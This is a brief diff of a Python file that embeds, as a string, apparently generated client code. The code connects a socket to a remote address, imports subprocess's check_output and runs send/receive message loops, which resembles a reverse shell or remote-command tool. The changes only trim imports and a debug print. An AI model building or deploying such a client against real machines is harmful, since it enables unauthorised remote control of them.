@@ -6,8 +6,6 @@ import threading
 
 var = """
 import socket as s
-import threading
-from os.path import exists
 from subprocess import check_output
 from time import sleep
 
@@ -23,7 +21,6 @@ client.connect(ADDR)
 
 def sendMsg(msg):
 	sendLength = str(len(msg)).encode("utf-8")
-	print(sendLength)
 	client.send(sendLength)
 
 	client.send(msg.encode(FORMAT))
@@ -58,7 +55,6 @@ def recvMsg():
 
 
 recvMsg()
-
 """
 
 
